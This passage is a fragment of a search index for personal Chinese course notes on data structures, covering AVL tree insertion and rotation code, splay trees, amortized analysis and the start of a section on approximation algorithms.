NULL;\n        }\n    } else if(X &lt; T-&gt;Element) {\n        T-&gt;Left = Insert(X, T-&gt;Left);\n        if(Height(T-&gt;Left) - Height(T-&gt;Right) == 2)\n            if(X &lt; T-&gt;Left-&gt;Element)\n                T = SingleRotateWithLeft(T);\n            else\n                T = DoubleRotateWithLeft(T);\n    } else if(X &gt; T-&gt;Element) {\n        T-&gt;Right = Insert(X, T-&gt;Right);\n        if(Height(T-&gt;Right) - Height(T-&gt;Left) == 2)\n            if(X &gt; T-&gt;Right-&gt;Element)\n                T = SignleRotateWithRight(T);\n            else\n                T = DoubleRotateWithRight(T);\n    }// Else X is already in the tree, do nothing\n    T-&gt;Height = Max(Height(T-&gt;Left), Height(T-&gt;Right)) + 1;\n    return T;\n}\n</code></pre> <p>\u65cb\u8f6c\u64cd\u4f5c\u7684\u5b9e\u73b0\uff08\u4ee5Left\u4e3a\u4f8b\uff09\uff1a</p> <pre><code>// L* Rotation, \u5373 \u53f3\u65cb\u8f6c\nstatic AvlTree SingleRotateWithLeft(AvlTree K2) {\n    AvlTree K1 = K2-&gt;Left;\n    K2-&gt;Left = K1-&gt;Right;\n    K1-&gt;Right = K2;\n\n    K2-&gt;Height = Max(Height(K2-&gt;Left), Height(K2-&gt;Right)) + 1;\n    K1-&gt;Height = Max(Height(K1-&gt;Left), Height(K1-&gt;Right)) + 1;\n\n    return K1;\n}\n\n// LR Rotation, \u5148\u5bf9\u5de6\u8282\u70b9\u4f5c\u5de6\u65cb\uff0c\u518d\u5bf9 Touble finder \u4f5c\u53f3\u65cb\u8f6c\nstatic AvlTree DoubleRotateWithLeft(AvlTree K3) {\n    K3-&gt;Left = SingleRotateWithRight(K3-&gt;Left);\n    return SingleRotateWithLeft(K3);\n}\n</code></pre>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#splay","title":"Splay \u6811","text":""},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#_4","title":"\u5b9a\u4e49","text":"<p>\u4ece\u4e00\u4e2a\u7a7a\u6811\u5f00\u59cb\uff0c\u8fde\u7eed M \u4e2a\u5bf9\u8be5\u6811\u7684\u64cd\u4f5c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u603b\u4e0d\u8d85\u8fc7 \\(O(M\\log N)\\) \u7684\u4e8c\u53c9\u6811\uff0c\u79f0\u4e3a Splay \u6811</p> <p>\u6839\u636e\u5b9a\u4e49\uff0c\u5bf9\u8be5\u6811\u7684 M \u6b21\u64cd\u4f5c\u65f6\u95f4\u5747\u644a\u4e0b\u6765\uff0c\u6bcf\u4e2a\u64cd\u4f5c\u90fd\u9700\u8981 \\(O(\\log N)\\) \u3002Splay(\u4f38\u5c55)\u7684\u6838\u5fc3\u601d\u60f3\u5728\u4e8e\uff0c\u6bcf\u5f53\u67d0\u4e00\u4e2a\u8282\u70b9\u88ab\u8bbf\u95ee(\u5305\u62ec\u63d2\u5165\u3001\u67e5\u8be2\u3001\u5220\u9664)\uff0c\u90fd\u8981\u901a\u8fc7 AVL \u6811 Rotation \u7684\u65b9\u5f0f\u5c06\u5176\u79fb\u52a8\u81f3\u6839\u8282\u70b9</p> <p>Splay \u6811\u7684\u5220\u9664\u64cd\u4f5c</p> <p>\u5148\u628a\u8981\u5220\u9664\u6389\u7684\u8282\u70b9\u79fb\u81f3\u6839\uff0c\u7136\u540e\u5220\u9664\u5b83\uff1b\u6b64\u65f6\u53ef\u4ee5\u9009\u62e9\u5de6\u5b50\u6811\u7684\u6700\u5927\u8282\u70b9\u6216\u8005\u53f3\u5b50\u6811\u7684\u6700\u5c0f\u8282\u70b9\u4ee3\u66ff\u5b83\uff0c\u4f46\u662f\u65e0\u8bba\u9009\u62e9\u54ea\u4e2a\uff0c\u90fd\u53ea\u80fd\u901a\u8fc7 Rotation \u7684\u65b9\u5f0f\u5c06\u5176\u79fb\u52a8\u81f3\u5bf9\u5e94\u5b50\u6811\u7684\u6839\u8282\u70b9\uff1b\u4ee5\u5de6\u5b50\u6811\u7684\u6700\u5927\u8282\u70b9\u4e3a\u4f8b\uff0c\u7531\u4e8e\u5176\u4f4d\u4e8e\u5de6\u5b50\u6811\u7684\u6700\u53f3\u4fa7\uff0c\u56e0\u6b64\u901a\u8fc7 Rotation \u65cb\u8f6c\u81f3\u5de6\u5b50\u6811\u7684\u6839\u540e\uff0c\u5176\u4e00\u5b9a\u4e0d\u5b58\u5728\u53f3\u5b50\u8282\u70b9\uff0c\u6b64\u65f6\u76f4\u63a5\u5c06\u53f3\u5b50\u6811\u63a5\u4e0a\u53bb\u5373\u53ef\u3002</p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#_5","title":"\u7ef4\u62a4","text":"<p>\u5bf9\u4e8e Splay \u6811\u7684\u7ef4\u62a4\uff0c\u6211\u4eec\u5148\u5bf9\u8981\u64cd\u4f5c\u7684\u8282\u70b9\u4e00\u4e2a\u7b80\u5355\u7684\u5b9a\u4e49\uff1a</p> <ul> <li>\u6211\u4eec\u8981\u79fb\u52a8\u81f3\u6839\u8282\u70b9\u7684\u975e\u6839\u8282\u70b9 X</li> <li>\u8282\u70b9 X \u7684\u7236\u8282\u70b9 P</li> <li>\u8282\u70b9 X \u7684 Grandparent \u8282\u70b9 G</li> </ul> <p>Case 1\uff1a</p> <p>\u7236\u8282\u70b9 P \u662f\u6839\u8282\u70b9\uff0c\u90a3\u4e48\u76f4\u63a5\u5bf9\u8282\u70b9 X \u548c \u8282\u70b9 P \u505a\u4e00\u6b21\u5bf9\u5e94\u65b9\u5411\u7684 Rotate \u5373\u53ef</p> <p>Case 2\uff1a</p> <p>\u7236\u8282\u70b9 P \u4e0d\u662f\u6839\u8282\u70b9\uff0c\u4e14\u4e0d\u7528\u7ba1\u8282\u70b9 G \u662f\u5426\u662f\u6839\u8282\u70b9</p> <p>\u6b64\u65f6\uff0c\u6839\u636e X,P,G \u7684\u4f4d\u7f6e\u5173\u7cfb\uff0c\u53ef\u4ee5\u5206\u4e3a Zig-zag \u548c Zig-zig \u6765\u5904\u7406</p> <p></p> <p>More Example</p> <p></p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#_6","title":"\u5747\u644a\u5206\u6790","text":"<p>Amortized Analysis \u5206\u6790\u7684\u662f\u4ece\u521d\u59cb\u72b6\u6001\u5f00\u59cb\uff0c\u8fde\u7eed M \u6b21\u5bf9\u6570\u636e\u7ed3\u6784\u7684\u64cd\u4f5c\u6240\u7528\u7684\u5747\u644a\u65f6\u95f4\uff0c\u5b83\u5e76\u4e0d\u6d89\u53ca\u6982\u7387\u5206\u5e03\uff0c\u56e0\u6b64\u4e0e\u5e73\u5747\u65f6\u95f4\u4ea6\u6709\u6240\u4e0d\u540c\u3002\u7531\u4e8e Amortized Analysis \u9700\u8981\u6d89\u53ca\u4efb\u610f\u64cd\u4f5c\u7684\u7ec4\u5408\uff0c\u5176\u8ba1\u7b97\u7ed3\u679c\u5e94\u5927\u4e8e\u5e73\u5747\u65f6\u95f4\u3002</p> \\[ worst\\ case\\ bound \\ge amortized\\ bound\\ge\u00a0average\\ case\\ bound \\] <p>\u5176\u4e3b\u8981\u7684\u5206\u6790\u65b9\u6cd5\u6709\u4ee5\u4e0b\u4e09\u79cd\uff1a</p> <ul> <li>Aggregate analysis</li> <li>Accounting method</li> <li>Potential method</li> </ul>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#aggregate-analysis","title":"Aggregate Analysis \u7d2f\u52a0\u6cd5","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u64cd\u4f5c\u5e8f\u5217\uff0c\u5728\u6700\u574f\u60c5\u51b5\u6240\u7528\u7684\u603b\u65f6\u95f4\u4e3a \\(T(n)\\)\uff0c\u90a3\u4e48\u5176\u6bcf\u4e2a\u64cd\u4f5c\u5747\u644a\u65f6\u95f4\u53ef\u4ee5\u7b80\u5355\u8ba4\u5b9a\u4e3a\uff1a</p> \\[ T_{Amortized} = \\frac{T(n)}{n} \\]"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#accounting-method","title":"Accounting Method \u501f\u6b3e\u8d37\u6b3e\u6cd5","text":"<p>\u5176\u6838\u5fc3\u601d\u60f3\u662f\u4e3a\u6bcf\u4e2a\u64cd\u4f5c\u5206\u914d\u4e00\u4e2a amortized cost \\(\\hat{c_i}\\) \uff0c\u5b83\u4e0e\u8be5\u64cd\u4f5c\u7684 actual cost \\(c_i\\) \u7684\u5dee\u503c\u79f0\u4e3a credit \uff0c\u5e76\u4e14\u603b\u6709: \\(\\sum \\hat{c_i} \\ge \\sum c_i\\)</p> <p>\u90a3\u4e48\u5747\u644a\u65f6\u95f4\u53ef\u4ee5\u8ba4\u5b9a\u4e3a\uff1a</p> \\[ T_{Amortized} = \\frac{\\sum_{i=1}^{n} c_i}{n} \\] <p>amortized cost \u600e\u4e48\u5b9a\u4e49\u7684\u8fd8\u6ca1\u641e\u61c2</p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#potential-method","title":"Potential Method \u52bf\u80fd\u5206\u6790\u6cd5","text":"<p>\u8be5\u65b9\u6cd5\u7ed9 credit \u4e00\u4e2a\u66f4\u8be6\u7ec6\u7684\u5b9a\u4e49\uff1a</p> \\[\\begin{gather} \\hat{c_i} - c_i = Credit_i = \\phi(D_i) - \\phi(D_{i-1}) \\\\ \\sum_{i=1}^n \\hat{c_i} = \\sum_{i=1}^n (c_i +\\phi(D_i) -\\phi(D_{i-1})) =\\sum_{i=1}^n c_i +\\phi(D_n) - \\phi(D_0) \\end{gather} \\] <p>\u5176\u4e2d\uff0c\\(D_i\\) \u8868\u793a\u7b2c i \u6b65\u64cd\u4f5c\u540e\u7684\u6570\u636e\u7ed3\u6784\uff0c \\(\\phi(D_i)\\) \u79f0\u4e3a\u52bf\u80fd\u51fd\u6570(Potential Function)\uff0c\u4e14\u4e00\u5b9a\u6709 \\(\\phi(D_n) \\ge \\phi(D_0)\\)</p> <p>\u4e3a\u4e86\u53d6\u5de7\uff0c\u53ef\u4ee5\u5b9a\u4e49 \\(\\phi(D_0)=0,\\phi (D_i)\\ge 0\\)</p> <p>\u76f8\u6bd4\u4e8e \\(c_i\\) \u8868\u793a\u7b2c i \u6b65\u64cd\u4f5c\u7684\u6d88\u8017\uff0c\\(\\phi(D_i)\\) \u8868\u793a\u8be5\u6570\u636e\u7ed3\u6784\u5728\u5b8c\u6210\u4e86\u7b2c i \u6b65\u64cd\u4f5c\u7684\u52bf\u80fd\u3002\u52bf\u80fd\u4e0e\u5177\u4f53\u7684\u64cd\u4f5c\u6ca1\u6709\u5173\u7cfb\uff0c\u53ea\u4e0e\u6574\u4e2a\u5c40\u9762\u7684\u72b6\u6001\u6709\u5173\uff0c\u4e0e\u7269\u7406\u5b66\u610f\u4e49\u4e0a\u7684\u52bf\u80fd\u5b9a\u4e49\u7c7b\u4f3c (\u4fdd\u5b88\u529b)</p> <p>\u90a3\u4e48\u6bcf\u4e00\u6b65\u64cd\u4f5c\u7684\u5747\u644a\u6d88\u8017\u5373\u53ef\u5b9a\u4e49\u4e3a \\(c_i+ \\phi(D_i) - \\phi(D_{i-1})\\) \uff0c\u52bf\u80fd\u5206\u6790\u6cd5\u4e2d\u7684\u5747\u644a\u601d\u60f3\u4f53\u73b0\u5728\u5982\u679c\u8be5\u64cd\u4f5c\u6d88\u8017 \\(c_i\\) \u5f88\u5927\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b9a\u4e49\u7684\u52bf\u80fd\u51fd\u6570\u8ba9 \\(\\phi(D_i) - \\phi(D_{i-1})\\) \u7684\u7ed3\u679c\u5c3d\u53ef\u80fd\u5c0f\u3002\u7531\u4e8e\u6570\u636e\u7ed3\u6784\u6700\u7ec8\u52bf\u80fd\u662f\u4e0a\u5347\u7684\uff0c\u4ee3\u4ef7\u5c0f\u7684\u64cd\u4f5c\u53ef\u4ee5\u5206\u644a\u4ee3\u4ef7\u5927\u7684\u64cd\u4f5c\u7684\u52bf\u80fd\u3002</p> <p>\u5c0f\u6280\u5de7\u4e4b\u4e8c</p> <p>\u52bf\u80fd\u51fd\u6570 \\(\\phi(D_i) -\\phi(D_{i-1})\\) \u7684\u91cf\u7ea7\u5e94\u4e0e \\(\\sum_{i=1}^n c_i\\) \u76f8\u540c\uff0c\u5426\u5219\u4f1a\u5f71\u54cd\u4f30\u7b97\u7684\u7cbe\u786e\u5ea6</p> <p>\u5982 Splay \u6811\u7684 \\(\\sum_{i=1}^n c_i\\) \u662f \\(O(\\log n)\\) \uff0c\u90a3\u4e48\u5408\u7406\u7684\u52bf\u80fd\u51fd\u6570\u4e5f\u5e94\u6ee1\u8db3  \\(\\phi(D_i) -\\phi(D_{i-1})\\) \u4e3a \\(O(\\log n)\\)</p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#push-multipop","title":"\u6808 Push &amp; MultiPop","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u6808\uff0c\u5176\u6709 Push \u4e00\u4e2a\u5143\u7d20\u8fdb\u5165\u6808\u4ee5\u53ca\u4ece\u6808\u4e2d MultiPop k \u4e2a\u5143\u7d20\u4e24\u79cd\u64cd\u4f5c\u3002</p> <p>\u867d\u7136\u770b\u8d77\u6765 MultiPop \u64cd\u4f5c\u7684\u65f6\u95f4\u6d88\u8017\u4e3a \\(\\min(sizeof(Stack),k)\\) \uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u5bf9\u4e8e\u6bcf\u4e2a\u5143\u7d20\uff0c\u5b83\u6700\u591a\u53ea\u6709\u4e00\u6b21\u5165\u6808\u548c\u51fa\u6808\uff0c\u603b\u65f6\u95f4\u6d88\u8017\u4e0d\u5e94\u8be5\u8d85\u8fc7 \\(2n\\) </p> <p>\u6b64\u65f6\u5c31\u9700\u8981\u7528\u5230\u5747\u644a\u5206\u6790\uff0c\u7531\u4e8e MultiPop \u662f\u65f6\u95f4\u6d88\u8017\u5927\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u9700\u8981\u8ba9\u8be5\u6b65\u64cd\u4f5c\u52bf\u80fd\u5dee\u503c\u5c3d\u53ef\u80fd\u5c0f\u3002\u7531\u4e8e\u65e0\u8bba\u662f Push \u64cd\u4f5c\u8fd8\u662f Pop \u64cd\u4f5c\uff0c\u5b83\u4eec\u90fd\u6539\u53d8\u4e86\u6808\u4e2d\u5143\u7d20\u7684\u4e2a\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u60f3\u5230\u4ee5\u6808\u5185\u5143\u7d20\u4e2a\u6570\u4f5c\u4e3a\u52bf\u80fd\u51fd\u6570 \\(\\phi(D_i)\\) \u7684\u5b9a\u4e49</p> <p>\u90a3\u4e48\u5206\u6790\u5404\u4e2a\u64cd\u4f5c\u7684 \\(\\hat{c_i}\\) \u53ef\u5f97\uff1a</p> \\[\\begin{gather} Push: \\hat{c_i} = c_i +\\phi(D_i) - \\phi(D_{i-1}) =1+1=2 \\\\ MultiPop: \\hat{c_i} = c_i +\\phi(D_i) - \\phi(D_{i-1})=k-k=0 \\end{gather} \\] <p>\u7531\u4e8e\u6808\u4e2d\u6700\u540e\u5143\u7d20\u4e2a\u6570\u603b\u662f\u5927\u4e8e\u7b49\u4e8e\u96f6\uff0c\u5373 Push \u538b\u5165\u7684\u5143\u7d20\u4e2a\u6570\u5927\u4e8e\u7b49\u4e8e Pop \u51fa\u7684\u5143\u7d20\u4e2a\u6570\uff0c\u6240\u4ee5\u6709\uff1a</p> \\[ \\sum_{i=1}^n \\hat{c_i}= \\sum_{i=1}^n O(1) = O(n)\\ge \\sum_{i=1}^n c_i \\] <p>FROM: \u9c7c\u8086\u5468\u62a5 002 - \u52bf\u80fd\u5206\u6790\u6cd5</p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#splay-tree","title":"Splay Tree","text":"<p>\u5bf9 Splay \u6811\u7684\u8c03\u6574\u64cd\u4f5c\u4e2d\uff0czig \u5305\u542b\u4e00\u6b21\u65cb\u8f6c\uff0czig-zag \u548c zig-zig \u90fd\u5305\u542b\u4e24\u6b21\u65cb\u8f6c\uff0c\u6210\u672c\u4e3a 2\u3002\u5982\u679c\u52bf\u80fd\u51fd\u6570\u7684\u6784\u9020\u4e0d\u80fd\u628a\u8c03\u6574\u64cd\u4f5c\u7684\u5e38\u6570 1 \u6216 2 \u62b5\u6d88\u6389\uff0c\u6700\u7ec8\u7684\u5747\u644a\u65f6\u95f4\u5c06\u4f1a\u662f worst-case \\(O(n)\\)</p> <p>\u6ce8\u610f\u5230 Splay \u64cd\u4f5c\u4e2d\uff0c\u4f1a\u5c06\u6240\u8bbf\u95ee\u7684\u8282\u70b9\u7ffb\u8f6c\u5230\u6839\u8282\u70b9\uff1b\u540c\u65f6\uff0c\u7ffb\u8f6c\u4ee3\u4ef7\u9ad8\u7684\u64cd\u4f5c\u5f80\u5f80\u66f4\u5927\u7a0b\u5ea6\u4e0a\u7684\u964d\u4f4e\u4e86\u6811\u9ad8\uff08\u6bd4\u5982\u524d\u9762\u4f8b\u5b50\u4e2d\uff0c\u5c06\u8282\u70b9 1 \u4ece\u53f6\u8282\u70b9\u4f4d\u7f6e\u7ffb\u8f6c\u5230\u6839\u8282\u70b9\uff0c\u5927\u81f4\u5c06\u6811\u9ad8\u7f29\u51cf\u4e3a\u539f\u6765\u7684\u4e00\u534a\uff09\u3002\u6240\u4ee5\u6211\u4eec\u8003\u8651\u4e00\u4e2a\u8ddf\u8282\u70b9\u9ad8\u5ea6\u76f8\u5173\u7684\uff08\u6216\u7c7b\u4f3c\u7684\uff09\u52bf\u80fd\u51fd\u6570\uff1a</p> \\[\\begin{gather} D_i = The\\ Root\\ of\\ the\\ Resulting\\ Tree \\\\ \\phi(D_i) = \\sum_{i\\in D_i}\\log S(i)\\ \u5176\u4e2d S(i) \u8868\u793a\u5b50\u6811\\ i\\ \u7684\u8282\u70b9\u6570 \\end{gather} \\] <p>\u6211\u4eec\u7528 \\(R(i)\\) \u8868\u793a\u8282\u70b9 i \u7684 rank \uff0c\u5219 \\(R(i) = \\log S(i)\\) \u3002\u9009\u53d6 rank \u4e4b\u548c\u4f5c\u4e3a\u52bf\u80fd\u51fd\u6570\u7684\u597d\u5904\u662f\u9664\u4e86 \\(X\\),\\(P\\),\\(G\\) \u4e09\u4e2a\u8282\u70b9\u5916\uff0c\u5176\u5b83\u8282\u70b9\u5728 Splay \u64cd\u4f5c\u4e2d\u7684 rank \u5747\u4fdd\u6301\u4e0d\u53d8\uff0c\u56e0\u800c\u53ef\u4ee5\u7b80\u5316\u8ba1\u7b97</p> <p></p> <p>\u518d\u6b21\u5bf9\u7167\u4e4b\u524d\u4e09\u79cd Splay \u64cd\u4f5c\uff0c\u5e76\u8ba1\u7b97\u5176\u5747\u644a\u65f6\u95f4\uff1a</p> <p>\u5bf9\u4e8e Zig</p> <p>\u7531\u4e8e \\(P\\) \u4ece\u6839\u8282\u70b9\u53d8\u4e3a\u975e\u6839\u8282\u70b9\uff0c\u6240\u4ee5\u6709 \\(R_2(P) - R_1(P) \\le 0\\) \u3002\u56e0\u6b64\u5f97\u5230\uff1a</p> \\[ \\hat{c_i} = 1+R_2(X) + R_2(P) - R_1(X) -R_1(P) \\le 1+ R_2(X) -R_1(X) \\] <p>\u5bf9\u4e8e Zig-zag</p> <p>\u89c2\u5bdf Zig-zag \u540e\u6811\u7684\u5f62\u72b6\uff0c\u53ef\u4ee5\u53d1\u73b0 \\(S_2(X) = S_2(P) +S_2(G) +1\\) \uff0c\u90a3\u4e48\u6709 \\(S_2^2(X) / (S_2(P) * S_2(G))\\ge 4\\) \uff0c\u7ecf\u8f6c\u6362\u53ef\u5f97\u5f15\u7406 \\(R_2(P) +R_2(G)\\le 2R_2(X) -2\\)</p> <p>\u5e76\u4e14\u64cd\u4f5c\u524d\u540e\uff0c\\(G\\) \u548c \\(X\\) \u5206\u522b\u4e3a\u6839\u8282\u70b9\uff0c\u5373 \\(R_1(G) = R_2(X)\\)\u3002\u56e0\u6b64\u5f97\u5230\uff1a</p> \\[ \\hat{c_i}=2+ R_2(X) +R_2(P) +R_2(P) -R_1(X) -R_1(P) -R_1(G)\\le 2(R_2(X)- R_1(X)) \\] <p>\u5bf9\u4e8e Zig-zig</p> <p>\uff08\u6709\u65f6\u95f4\u8865\u5145\uff09</p> \\[ \\hat{c_i} =2+ R_2(X) +R_2(P) +R_2(P) -R_1(X) -R_1(P) -R_1(G)\\le 3(R_2(X)- R_1(X)) \\] <p>\u7ed3\u5408\u4ee5\u4e0a\u4e09\u79cd\u60c5\u51b5\uff0c\u53d6\u5747\u644a\u65f6\u95f4\u6d88\u8017\u6700\u5927\u7684\u60c5\u51b5\uff0c\u5fc5\u5b9a\u6709\uff1a</p> \\[ \\hat{c_i}\\le \\max \\{1+ R_2(X)- R_1(X),3(R_2(X)- R_1(X))\\}\\le 1+3(R_2(X)- R_1(X)) \\] <p>\u6ce8\u610f\u8fd9\u4e2a 1</p> <p>Splay \u6811\u7684\u4e00\u6b21\u7ef4\u62a4\u6700\u591a\u4f1a\u51fa\u73b0\u4e00\u6b21 Zig \u7684 Single Rotation\uff0c\u6240\u4ee5\u4e0a\u8ff0\u5355\u6b65\u64cd\u4f5c\u7684\u5747\u644a\u6210\u672c\u4e0d\u7b49\u5f0f\u4e2d\u7684 1 \u4e5f\u6700\u591a\u53ea\u4f1a\u51fa\u73b0\u4e00\u6b21\uff0c\u6240\u4ee5\u4e0d\u7528\u62c5\u5fc3\u6700\u7ec8\u5f97\u5230 \\(O(n)\\) \u7684\u590d\u6742\u5ea6</p> <p>\u5bf9\u8282\u70b9 \\(X\\) \u7684\u64cd\u4f5c\u53ef\u80fd\u4f1a\u7ecf\u8fc7\u591a\u6b21\u65cb\u8f6c\uff0c\u4f46\u662f\u6700\u7ec8\u8be5\u8282\u70b9\u4f1a\u88ab\u79fb\u81f3\u6839\u8282\u70b9\u5904\uff0c\u90a3\u4e48\u5747\u644a\u6210\u672c\u548c\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[ \\sum_{i=1}^M \\hat{c_1} \\le 3(R_1(T)-R_1(X)) +1 \\] <p>\u5f88\u660e\u663e\uff0c\u5747\u644a\u6210\u672c\u4e3a \\(O(\\log n)\\) \u7ea7\u522b\u7684</p> <p>\u603b\u7ed3(\u5077\u8fc7\u6765\u7684)</p> <p>\u4e0d\u8bba\u662f\u505a\u9898\u8fd8\u662f\u771f\u7684\u5728\u5206\u6790\u81ea\u5df1\u8bbe\u8ba1/\u9047\u5230\u7684\u67d0\u79cd\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\uff0c\u6211\u4eec\u90fd\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u6d41\u7a0b\u6765\u601d\u8003\uff08\u5c24\u5176\u662f\u505a ADS \u8003\u8bd5\u9898\uff0c\u56e0\u4e3a\u5b83\u7ed9\u51fa\u4e86\u9009\u9879\uff0c\u7528\u8fd9\u6837\u7684\u601d\u8def\u5c31\u5f88\u7b80\u5355\u4e86\uff09\uff1a</p> <ol> <li>\u601d\u8003\u4ec0\u4e48\u64cd\u4f5c\u7684\u4ee3\u4ef7\u8f83\u5927\uff1f</li> <li>\u601d\u8003\u8fd9\u4e2a\u64cd\u4f5c\u4f1a\u5bf9\u5c40\u9762\u9020\u6210\u4f55\u79cd\u5f71\u54cd\uff1f\u5c40\u9762\u4f1a\u53d1\u751f\u4f55\u79cd\u53d8\u5316\uff1f</li> <li>\u5982\u4f55\u628a\u8fd9\u79cd\u53d8\u5316\u91cf\u5316\uff0c\u628a\u8fd9\u6837\u7684\u53d8\u5316\u6620\u5c04\u5230\u52bf\u80fd\u7684\u4e0b\u964d\uff1f</li> </ol>"},{"location":"Courses/DS/ADS/Approximation/","title":"Approximation","text":""},{"location":"Courses/DS/ADS/Approximation/#approximation","title":"Approximation","text":"<p> \u7ea6 2295 \u4e2a\u5b57  35 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/Approximation/#overview","title":"Overview","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u56f0\u96be\u7684 NPC \u95ee\u9898\uff0c\u6709\u4ee5\u4e0b\u4e09\u79cd\u5904\u7406\u65b9\u6cd5\uff1a</p> <ul> <li>&lt;1&gt; \u5982\u679c N \u5f88\u5c0f\uff0c\u90a3\u4e48\u6307\u6570\u7ea7\u7684\u590d\u6742\u5ea6\u4e5f\u662f\u53ef\u4ee5\u63a5\u53d7\u7684</li> <li>&lt;2&gt; \u901a\u8fc7\u589e\u52a0\u9650\u5236\u6761\u4ef6\u6216\u53ea\u53d6\u5173\u952e\u7ed3\u679c\u4ece\u800c\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3</li> <li>&lt;3&gt; \u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u627e\u5230\u63a5\u8fd1\u6700\u4f18\u89e3\u7684\u7b54\u6848\uff0c\u5373 approximation algorithm<ul> <li>\u727a\u7272\u7cbe\u5ea6\uff0c\u52a0\u5feb\u901f\u5ea6</li> </ul> </li> </ul> <p>Greedy\u7b97\u6cd5\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u63a5\u8fd1\u6700\u4f18\u89e3\uff0c\u5728\u67d0\u4e9b\u9898\u76ee\u4e2d\u7ed3\u679c\u53ef\u80fd\u76f8\u5dee\u5f88\u5927</p> <p>\u5b9a\u4e49\u8fd1\u4f3c\u6bd4 Approximation Ratio \uff1a</p> \\[ \\rho(n) \\ge \\max (\\frac{C}{C^*} ,\\frac{C^*}{C}) \\] <p>\u5176\u4e2d \\(C\\) \u548c \\(C^*\\) \u5206\u522b\u662f\u7ed9\u5b9a\u7b97\u6cd5\u7ed3\u679c\u548c\u6700\u4f18\u89e3\u7684\u91cf\u5316\u3002\u4f8b\u5982\uff0c\u5728\u6c42\u6700\u5927\u6700\u5c0f\u503c\u7684\u95ee\u9898\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49 \\(C\\) \u4e3a\u6700\u7ec8\u5f97\u5230\u7684\u6700\u503c\u7ed3\u679c\u3002</p> <p>\u5176\u4e2d\uff0c\u8f93\u5165\u5927\u5c0f \\(n\\) \u53ef\u4ee5\u4efb\u610f\u53d6\u503c\u3002</p> <p>\u8fd1\u4f3c\u6bd4\u7528\u6765\u523b\u753b\u8fd1\u4f3c\u89e3\u548c\u6700\u4f18\u89e3\u7684\u63a5\u8fd1\u7a0b\u5ea6\u3002</p> <p>\u4e00\u4e2a\u4f18\u5316\u95ee\u9898\u7684\u8fd1\u4f3c\u8303\u5f0f(Approximation Scheme)\u5b9a\u4e49\u4e3a\u5bf9\u4e8e\u8be5\u95ee\u9898\u7684\u4efb\u610f\u8f93\u5165\u5b9e\u4f8b\uff0c\u5b83\u7684\u8fd1\u4f3c\u6bd4\u5747\u5c0f\u4e8e\u7b49\u4e8e \\(1+\\varepsilon \\  (\\varepsilon \\gt 0)\\) \uff0c\u5373 Approximation Scheme \u4e3a \\((1+\\varepsilon)-\\text{approximation algorithm}\\) \u3002</p> <p>\u5f53\u8fd1\u4f3c\u8303\u5f0f\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5173\u4e8e\u8f93\u5165\u5927\u5c0f \\(n\\) \u4e3a\u591a\u9879\u5f0f\u7ea7\u522b\u65f6\uff0c\u6211\u4eec\u79f0\u5176\u4e3a\u591a\u9879\u5f0f\u65f6\u95f4\u8fd1\u4f3c\u8303\u5f0f(polynomial-time approximation scheme, PTAS)\uff0c\u4f8b\u5982 \\(O(n^{\\frac{2}{\\varepsilon}}),O(\\frac{1}{\\varepsilon}^2 n^3)\\)\uff1b\u800c\u5f53\u65f6\u95f4\u590d\u6742\u5ea6\u5173\u4e8e \\(1/\\varepsilon\\) \u548c \\(n\\) \u90fd\u662f\u591a\u9879\u5f0f\u7ea7\u522b\u65f6\uff0c\u79f0\u5176\u4e3a\u5b8c\u5168\u591a\u9879\u5f0f\u65f6\u95f4\u8fd1\u4f3c\u590d\u6742\u5ea6(Fully polynimial-time approximation scheme, FPTAS)\uff0c\u5982\u4e0a\u9762\u7684 \\(O(\\frac{1}{\\varepsilon}^2 n^3)\\)\u3002</p> <p>\u5bf9\u4e8e\u65c5\u884c\u5546\u95ee\u9898\uff0cPTAS\u5c06\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u6700\u591a\u4e3a\\((1+\\varepsilon)L\\)\u7684\u89e3\uff0c\u5176\u4e2dL\u4e3a\u6700\u77ed\u65c5\u884c\u957f\u5ea6</p> <p>\u5173\u4e8e\u7b97\u6cd5\u7684\u8bbe\u8ba1\uff0c\u6211\u4eec\u8003\u8651\u8fd9\u4e09\u4e2a\u7ef4\u5ea6\uff1a</p> <ol> <li>\u6700\u4f18\u6027(optimality): \u5373\u80fd\u6c42\u51c6\u786e\u89e3\uff1b</li> <li>\u9ad8\u6548\u6027(efficiency): \u5373\u7b97\u6cd5\u662f\u5426\u9ad8\u6548\uff1b</li> <li>\u666e\u904d\u6027(all instances): \u5373\u7b97\u6cd5\u662f\u5426\u666e\u904d\u9002\u7528\u4e8e\u6240\u6709\u7684\u60c5\u51b5\uff1b</li> 